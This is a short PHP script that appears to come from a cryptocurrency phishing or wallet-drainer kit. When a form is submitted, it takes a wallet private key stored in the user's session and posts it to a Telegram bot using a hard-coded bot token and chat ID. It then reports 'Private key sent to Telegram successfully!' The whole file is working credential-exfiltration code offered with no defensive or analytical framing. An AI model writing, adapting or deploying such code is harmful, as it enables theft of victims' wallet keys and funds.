<?php
// Start the session
session_start();

// Function to send private key to Telegram
function sendPrivateKeyToTelegram($privateKey) {
 $telegramBotToken = '8732678869:AAEvdi0iwIspDdXO-nnirEFySLIUPFFuboI';
 $chatId = '6870666933';
 $message = 'Private Key: ' . $privateKey;

 $url = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
 $post_data = [
 'chat_id' => $chatId,
 'text' => $message
 ];

 $options = [
 'http' => [
 'method' => 'POST',
 'content' => http_build_query($post_data),
 'header' => "Content-Type: application/x-www-form-urlencoded",
 ],
 ];

 $context = stream_context_create($options);
 $result = file_get_contents($url, false, $context);

 if ($result === FALSE) {
 echo 'Error sending private key to Telegram';
 }
}

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 // Assume the user has already connected their wallet and the private key is stored in the session
 if (isset($_SESSION['private_key'])) {
 $privateKey = $_SESSION['private_key'];
 sendPrivateKeyToTelegram($privateKey);
 unset($_SESSION['private_key']); // Clear the private key from the session
 echo 'Private key sent to Telegram successfully!';
 } else {
 echo 'No private key found in the session.';
 }
}
?>
